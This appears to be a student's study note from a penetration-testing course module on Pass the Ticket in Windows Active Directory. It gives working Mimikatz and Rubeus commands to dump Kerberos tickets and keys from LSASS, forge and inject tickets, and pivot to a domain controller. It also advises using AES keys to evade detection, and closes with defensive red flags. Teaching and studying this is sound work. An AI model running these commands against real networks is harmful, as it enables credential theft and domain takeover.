# 🎫 Pass the Ticket (PtT) — Windows

> **Module Section:** 21 / 26 — Password Attacks

## Overview

**Pass the Ticket (PtT)** is an Active Directory lateral movement technique that uses a **stolen Kerberos ticket** (instead of an NTLM hash) to authenticate as another user.

---

## Kerberos Refresher

Kerberos is a **ticket-based** authentication system. Rather than sending passwords to every service, tickets are presented to prove identity.

| Ticket | Purpose |
|--------|---------|
| **TGT** (Ticket Granting Ticket) | First ticket obtained — used to request further service tickets |
| **TGS** (Ticket Granting Service) | Service-specific ticket — presented to a service to authenticate |

### Authentication Flow

1. Client encrypts the current timestamp with their password hash → sent to the **KDC** (Domain Controller)
2. KDC validates identity (it knows the hash) → returns a **TGT**
3. To access a service (e.g., MSSQL), client presents TGT to KDC → receives **TGS**
4. Client presents TGS to target service → granted access

---

## PtT Attack Requirements

We need a valid Kerberos ticket, which can be:

- **TGS** — grants access to a specific resource
- **TGT** — allows us to request TGS tickets for any service the user has access to

---

## 1️⃣ Harvesting Tickets from Windows

Tickets are processed and stored by **LSASS**. As a **local administrator**, we can collect all tickets; otherwise, only our own.

### Mimikatz — Export All Tickets

```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Exports `.kirbi` files to disk for every ticket in memory.

#### Ticket Naming Convention

| Filename Pattern | Meaning |
|------------------|---------|
| `[luid]-N-M-flags-USER$@service-...kirbi` | Computer account (trailing `$`) |
| `[luid]-N-M-flags-USER@service-domain.kirbi` | User ticket |
| `*@krbtgt-domain.kirbi` | **TGT** (ticket for the KRBTGT service = the TGT) |

### Rubeus — Export Tickets (Base64)

```cmd
c:\tools> Rubeus.exe dump /nowrap
```

Prints ticket in **Base64** instead of writing `.kirbi` files. Use `/nowrap` for easier copy-paste.

> ⚠️ **Admin required** for either tool to collect *all* tickets (not just your own).

> 🐛 **Known issue:** Recent Mimikatz versions may misreport encryption as `des_cbc_md4` on some Windows 10 builds, producing broken exports. Use **Rubeus** instead in those cases.

---

## 2️⃣ Pass the Key (OverPass the Hash)

Converts an **NTLM or AES key** into a full **TGT** via Kerberos — merging the PtH and PtT worlds.

> Unlike classic PtH (which never touches Kerberos), OverPass the Hash uses the hash/key to obtain a real TGT.

### Extract Kerberos Keys with Mimikatz

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Output includes:
- `aes256_hmac` key
- `rc4_hmac_nt` (= NTLM hash)
- Plus legacy variants

### Mimikatz — OverPass the Hash (requires admin)

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Opens a new `cmd.exe` running under the target user's context.

### Rubeus — `asktgt` (no admin required)

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

| Hash Flag | Key Type |
|-----------|----------|
| `/rc4` | NTLM / RC4_HMAC |
| `/aes128` | AES-128 |
| `/aes256` | AES-256 (recommended — avoids downgrade detection) |
| `/des` | DES (legacy) |

> ⚠️ **Encryption downgrade warning:** Modern AD (2008+ functional level) uses AES by default. Using `rc4_hmac` may trigger detection as an **encryption downgrade**.

| Tool | Admin Required? |
|------|-----------------|
| Mimikatz `sekurlsa::pth` | ✅ Yes |
| Rubeus `asktgt` | ❌ No |

---

## 3️⃣ Pass the Ticket

Once we have a ticket, inject it into the current logon session.

### Rubeus — Request + Import in One Step (`/ptt`)

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Look for: `[+] Ticket successfully imported!`

### Rubeus — Import `.kirbi` File

```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Convert `.kirbi` → Base64 (PowerShell)

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### Rubeus — Import Base64 Ticket

```cmd
c:\tools> Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

### Mimikatz — Import `.kirbi`

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\path\to\ticket.kirbi"
```

### Verify Import

```cmd
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

> 💡 **Tip:** `misc::cmd` in Mimikatz opens a new `cmd.exe` window with the imported ticket — no need to exit and re-run commands.

---

## 4️⃣ PtT + PowerShell Remoting (Lateral Movement)

**PowerShell Remoting** runs on:
- **TCP/5985** (HTTP)
- **TCP/5986** (HTTPS)

### Required Group Membership

To connect via PSRemoting, the user must be:
- **Administrator**, OR
- Member of **Remote Management Users**, OR
- Have explicit PSRemoting permissions

### Mimikatz PtT → PSRemoting

```cmd
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\...\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz # exit

c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

### Rubeus — Sacrificial Process + PtT

Create an isolated logon session (Logon Type 9) so we don't trample the current user's TGTs:

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then from the **new cmd window**, request a TGT and inject:

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES256_KEY> /ptt
```

Then pivot:

```cmd
c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

---

## PtT Method Comparison

| Method | Tool | Admin Required | Input Format |
|--------|------|----------------|--------------|
| Import `.kirbi` | Rubeus `ptt /ticket:` | ❌ | File |
| Import Base64 | Rubeus `ptt /ticket:` | ❌ | String |
| Import `.kirbi` | Mimikatz `kerberos::ptt` | ❌ (for import) | File |
| Request + Inject TGT | Rubeus `asktgt /ptt` | ❌ | Hash / AES key |
| Inject via token | Mimikatz `sekurlsa::pth` | ✅ | Hash |

---

## Defensive Red Flags

- 🚨 **Encryption downgrade** — TGT requested with RC4 when AES is default
- 🚨 **Unusual logon types** — Logon Type 9 (NetCredentials) from random processes
- 🚨 **`krbtgt` TGT export** from non-DC host
- 🚨 **Lateral PSRemoting** (5985/5986) from workstation to DC

---

## Key Takeaways

1. **PtT uses Kerberos tickets**, not NTLM hashes
2. Two ticket types: **TGT** (multi-purpose) vs **TGS** (service-specific)
3. **LSASS holds tickets** — admin rights needed to dump all tickets
4. **Mimikatz `sekurlsa::tickets /export`** → `.kirbi` files
5. **Rubeus `dump /nowrap`** → Base64 tickets (better reliability on some Win10 builds)
6. **OverPass the Hash** = convert a hash/key → TGT (bridges PtH and PtT)
7. **Use AES keys, not RC4**, to avoid encryption downgrade detection
8. **Rubeus `asktgt /ptt`** requests + injects a TGT in one step — **no admin needed**
9. **Mimikatz `kerberos::ptt`** imports a `.kirbi` file into the current session
10. **`createnetonly`** creates a sacrificial process for PtT without trashing the current logon
11. PSRemoting (5985/5986) after PtT → lateral movement to DCs/servers

---

## Exercise

*Add exercise answers here as you complete them*

---

## References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Rubeus OverPass the Hash docs](https://github.com/GhostPack/Rubeus#examples)
- Delpy & Duckwall — *Abusing Microsoft Kerberos — Sorry you guys don't get it*
